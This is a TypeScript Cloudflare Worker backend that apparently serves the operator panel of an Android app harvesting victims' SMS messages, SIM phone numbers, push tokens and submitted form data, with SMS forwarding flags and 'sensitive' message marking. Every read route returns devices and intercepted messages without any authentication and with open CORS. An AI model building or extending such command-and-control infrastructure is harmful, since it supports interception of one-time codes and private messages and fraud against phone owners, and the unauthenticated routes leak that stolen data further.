/// <reference types="@cloudflare/workers-types" />

import { neon } from "@neondatabase/serverless";

interface Env {
  ASSETS: Fetcher;
  GOOGLE_CLIENT_ID?: string;
  NEON_DATABASE_URL: string;
}

/** Render backend — writes + auth only */
const BACKEND = "https://mr-recovery-api-502z.onrender.com";

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET,POST,PATCH,PUT,DELETE,OPTIONS",
  "Access-Control-Allow-Headers":
    "Content-Type,Authorization,x-master-pin,x-master-session,x-api-key,x-session-token,x-silent,cache-control",
  "Access-Control-Max-Age": "86400",
};

function json(data: unknown, status = 200): Response {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json", ...CORS },
  });
}

// ── Row mappers (snake_case DB → camelCase API) ───────────────────────────────

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function mapDevice(r: any) {
  return {
    id: r.id, deviceId: r.device_id, appId: r.app_id, userId: r.user_id, name: r.name,
    androidVersion: r.android_version,
    sim1Carrier: r.sim1_carrier, sim1Phone: r.sim1_phone,
    sim2Carrier: r.sim2_carrier, sim2Phone: r.sim2_phone,
    status: r.status, lastOnline: r.last_online ? new Date(r.last_online).toISOString() : null,
    forwardEnabled: r.forward_enabled, forwardSlot: r.forward_slot,
    fcmToken: r.fcm_token,
    installedAt: r.installed_at ? new Date(r.installed_at).toISOString() : new Date().toISOString(),
    updatedAt:   r.updated_at   ? new Date(r.updated_at).toISOString()   : new Date().toISOString(),
  };
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function mapMessage(r: any) {
  return {
    id: r.id, appId: r.app_id, deviceId: r.device_id, userId: r.user_id,
    fromSender: r.from_sender, fromNumber: r.from_number,
    body: r.body, isSensitive: r.is_sensitive,
    receivedAt: r.received_at ? new Date(r.received_at).toISOString() : new Date().toISOString(),
  };
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function mapApp(r: any) {
  return {
    id: r.id, appId: r.app_id, name: r.name, status: r.status,
    createdAt: r.created_at ? new Date(r.created_at).toISOString() : new Date().toISOString(),
    deleteProtectionEnabled: r.delete_protection_enabled ?? false,
    hasPin: !!(r.delete_protection_pin),
  };
}

// ── Proxy write request to Render ─────────────────────────────────────────────
async function proxyToRender(request: Request, path: string): Promise<Response> {
  const url = new URL(request.url);
  const backendUrl = BACKEND + path + url.search;
  try {
    const resp = await fetch(new Request(backendUrl, {
      method: request.method,
      headers: request.headers,
      body: ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
      redirect: "follow",
    }));
    const headers = new Headers(resp.headers);
    for (const [k, v] of Object.entries(CORS)) headers.set(k, v);
    return new Response(resp.body, { status: resp.status, statusText: resp.statusText, headers });
  } catch {
    return json({ error: "Backend unreachable" }, 502);
  }
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const { pathname } = url;
    const method = request.method;

    // ── CORS preflight ──────────────────────────────────────────────────────
    if (method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });

    // ── WebSocket — native CF Worker WebSocket (shows Live indicator) ───────
    if (request.headers.get("Upgrade") === "websocket") {
      const pair = new WebSocketPair();
      const [client, server] = [pair[0], pair[1]];
      server.accept();
      server.send(JSON.stringify({ event: "ping", data: { t: Date.now() } }));
      server.addEventListener("message", (_e: MessageEvent) => {
        try { server.send(JSON.stringify({ event: "pong", data: { t: Date.now() } })); } catch { /**/ }
      });
      return new Response(null, { status: 101, webSocket: client });
    }

    // ── Auth config (no Render needed) ─────────────────────────────────────
    if (pathname === "/api/auth/config" && method === "GET") {
      return json({
        googleClientId: env.GOOGLE_CLIENT_ID ??
          "461863915234-r9tvbtn7kr2pm9hpebmj301nrv6bg03h.apps.googleusercontent.com",
      });
    }

    // ── Only handle /api/* beyond here ─────────────────────────────────────
    if (!pathname.startsWith("/api/")) {
      const resp = await env.ASSETS.fetch(request);
      if (resp.status === 404) {
        const isAsset = /\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|json|webp|txt|xml)$/i.test(pathname);
        if (!isAsset) {
          return env.ASSETS.fetch(new Request(new URL("/index.html", request.url).toString(), { headers: request.headers }));
        }
      }
      return resp;
    }

    // ── From here: all /api/* routes ────────────────────────────────────────
    // WRITES → always proxy to Render
    const isWrite = !["GET", "HEAD"].includes(method);
    const writeRoutes = [
      "/api/messages", "/api/devices", "/api/data", "/api/apps",
      "/api/fcm", "/api/master", "/api/admin", "/api/register",
      "/api/tokens", "/api/auth",
    ];
    const isWriteRoute = isWrite && writeRoutes.some(p => pathname.startsWith(p));
    // DELETE always to Render
    const isDelete = method === "DELETE";

    if (isWriteRoute || isDelete) {
      return proxyToRender(request, pathname);
    }

    // ── READ routes → direct Neon DB ────────────────────────────────────────
    if (!env.NEON_DATABASE_URL) {
      // Fallback: proxy to Render if DB not configured
      return proxyToRender(request, pathname);
    }

    const db = neon(env.NEON_DATABASE_URL);

    try {
      // ── GET /api/notice ────────────────────────────────────────────────
      if (pathname === "/api/notice") {
        const rows = await db`SELECT id, text FROM notices WHERE active = true ORDER BY created_at DESC`;
        return json({ notices: rows });
      }

      // ── GET /api/master/stats ─────────────────────────────────────────
      if (pathname === "/api/master/stats") {
        const [apps, devices, msgs, sessions] = await Promise.all([
          db`SELECT COUNT(*)::int AS total, COUNT(*) FILTER (WHERE status='active')::int AS active, COUNT(*) FILTER (WHERE created_at >= NOW()-INTERVAL '1 day')::int AS today FROM apps`,
          db`SELECT COUNT(*)::int AS total, COUNT(*) FILTER (WHERE last_online >= NOW()-INTERVAL '5 minutes')::int AS online FROM devices`,
          db`SELECT COUNT(*)::int AS total, COUNT(*) FILTER (WHERE received_at >= NOW()-INTERVAL '1 day')::int AS today FROM messages`,
          db`SELECT COUNT(*)::int AS active FROM master_sessions`,
        ]);
        return json({
          totalApps:      apps[0]?.total     ?? 0,
          activeApps:     apps[0]?.active    ?? 0,
          appsToday:      apps[0]?.today     ?? 0,
          totalDevices:   devices[0]?.total  ?? 0,
          onlineCount:    devices[0]?.online ?? 0,
          totalMessages:  msgs[0]?.total     ?? 0,
          messagesToday:  msgs[0]?.today     ?? 0,
          activeSessions: sessions[0]?.active ?? 0,
        });
      }

      // ── GET /api/master/notices ───────────────────────────────────────
      if (pathname === "/api/master/notices") {
        const rows = await db`SELECT id, text, active, created_at FROM notices ORDER BY created_at DESC`;
        return json(rows.map((r: any) => ({ id: r.id, text: r.text, active: r.active, createdAt: r.created_at })));
      }

      // ── GET /api/master/ping ──────────────────────────────────────────
      if (pathname === "/api/master/ping" && method === "POST") {
        return json({ ok: true });
      }

      // ── GET /api/master/sse-token → proxy to Render ───────────────────
      if (pathname === "/api/master/sse-token") {
        return proxyToRender(request, pathname);
      }

      // ── GET /api/master/sessions ──────────────────────────────────────
      if (pathname === "/api/master/sessions") {
        const rows = await db`SELECT id, ip, user_agent, login_at FROM master_sessions ORDER BY login_at DESC`;
        return json(rows.map((r: any) => ({ id: r.id, ip: r.ip, userAgent: r.user_agent, loginAt: r.login_at })));
      }

      // ── GET /api/master/all-devices ───────────────────────────────────
      if (pathname === "/api/master/all-devices") {
        const hasFcm = url.searchParams.get("hasFcm") === "1";
        const appId  = url.searchParams.get("appId") || null;
        let rows: unknown[];
        if (appId) {
          rows = await db`SELECT * FROM devices WHERE app_id = ${appId} ORDER BY installed_at DESC`;
        } else {
          rows = await db`SELECT * FROM devices ORDER BY installed_at DESC`;
        }
        const mapped = (rows as any[]).map(mapDevice);
        return json(hasFcm ? mapped.filter((d: any) => d.fcmToken) : mapped);
      }

      // ── GET /api/apps (list all) ──────────────────────────────────────
      if (pathname === "/api/apps" && method === "GET") {
        const rows = await db`
          SELECT a.id, a.app_id, a.name, a.status, a.created_at,
            s.delete_protection_pin, COALESCE(s.delete_protection_enabled, false) AS delete_protection_enabled
          FROM apps a LEFT JOIN app_secrets s ON s.app_id = a.app_id
          ORDER BY a.created_at ASC`;
        return json((rows as any[]).map(mapApp));
      }

      // ── GET /api/apps/:appId ──────────────────────────────────────────
      const appMatch = pathname.match(/^\/api\/apps\/([^/]+)$/);
      if (appMatch && method === "GET") {
        const appId = decodeURIComponent(appMatch[1]);
        const rows = await db`
          SELECT a.id, a.app_id, a.name, a.status, a.created_at,
            s.delete_protection_pin, COALESCE(s.delete_protection_enabled, false) AS delete_protection_enabled
          FROM apps a LEFT JOIN app_secrets s ON s.app_id = a.app_id
          WHERE a.app_id = ${appId} LIMIT 1`;
        if (!rows.length) return json({ error: "App not found" }, 404);
        return json(mapApp(rows[0]));
      }

      // ── GET /api/apps/:appId/delete-protection ────────────────────────
      const dpMatch = pathname.match(/^\/api\/apps\/([^/]+)\/delete-protection$/);
      if (dpMatch && method === "GET") {
        const appId = decodeURIComponent(dpMatch[1]);
        const rows = await db`
          SELECT COALESCE(s.delete_protection_enabled, false) AS enabled,
                 (s.delete_protection_pin IS NOT NULL) AS has_pin
          FROM apps a LEFT JOIN app_secrets s ON s.app_id = a.app_id
          WHERE a.app_id = ${appId} LIMIT 1`;
        if (!rows.length) return json({ error: "App not found" }, 404);
        return json({ enabled: (rows[0] as any).enabled, hasPin: (rows[0] as any).has_pin });
      }

      // ── GET /api/messages ─────────────────────────────────────────────
      if (pathname === "/api/messages" && method === "GET") {
        const appId    = url.searchParams.get("appId");
        const userId   = url.searchParams.get("userId");
        const deviceId = url.searchParams.get("deviceId");
        let rows: unknown[];
        if (appId) {
          rows = await db`SELECT * FROM messages WHERE app_id = ${appId} ORDER BY received_at DESC LIMIT 500`;
        } else if (userId) {
          rows = await db`SELECT * FROM messages WHERE user_id = ${userId} ORDER BY received_at DESC LIMIT 500`;
        } else if (deviceId) {
          rows = await db`SELECT * FROM messages WHERE device_id = ${deviceId} ORDER BY received_at DESC LIMIT 500`;
        } else {
          rows = await db`SELECT * FROM messages ORDER BY received_at DESC LIMIT 500`;
        }
        return json((rows as any[]).map(mapMessage));
      }

      // ── GET /api/devices ──────────────────────────────────────────────
      if (pathname === "/api/devices" && method === "GET") {
        const appId  = url.searchParams.get("appId");
        const userId = url.searchParams.get("userId");
        let rows: unknown[];
        if (appId) {
          rows = await db`SELECT * FROM devices WHERE app_id = ${appId} ORDER BY installed_at DESC`;
        } else if (userId) {
          rows = await db`SELECT * FROM devices WHERE user_id = ${userId} ORDER BY installed_at DESC`;
        } else {
          rows = await db`SELECT * FROM devices ORDER BY installed_at DESC`;
        }
        return json((rows as any[]).map(mapDevice));
      }

      // ── GET /api/devices/:deviceId ────────────────────────────────────
      const devMatch = pathname.match(/^\/api\/devices\/([^/]+)$/);
      if (devMatch && method === "GET") {
        const deviceId = decodeURIComponent(devMatch[1]);
        const rows = await db`SELECT * FROM devices WHERE device_id = ${deviceId} LIMIT 1`;
        if (!rows.length) return json({ error: "Device not found" }, 404);
        return json(mapDevice(rows[0]));
      }

      // ── GET /api/data (form data) ─────────────────────────────────────
      if (pathname === "/api/data" && method === "GET") {
        const appId    = url.searchParams.get("appId") ?? "";
        const deviceId = url.searchParams.get("deviceId");
        let rows: unknown[];
        if (deviceId) {
          rows = await db`SELECT * FROM form_data WHERE app_id = ${appId} AND device_id = ${deviceId} ORDER BY submitted_at DESC`;
        } else {
          rows = await db`SELECT * FROM form_data WHERE app_id = ${appId} ORDER BY submitted_at DESC`;
        }
        return json((rows as any[]).map((r: any) => ({
          id: r.id, appId: r.app_id, deviceId: r.device_id,
          data: r.data, submittedAt: r.submitted_at ? new Date(r.submitted_at).toISOString() : new Date().toISOString(),
        })));
      }

      // ── GET /api/admin/sessions ───────────────────────────────────────
      if (pathname === "/api/admin/sessions" && method === "GET") {
        return proxyToRender(request, pathname);
      }

      // ── All other GET /api/* → proxy to Render ────────────────────────
      return proxyToRender(request, pathname);

    } catch (err) {
      // DB error → fallback to Render
      console.error("Neon query failed, falling back to Render:", err);
      return proxyToRender(request, pathname);
    }
  },
};
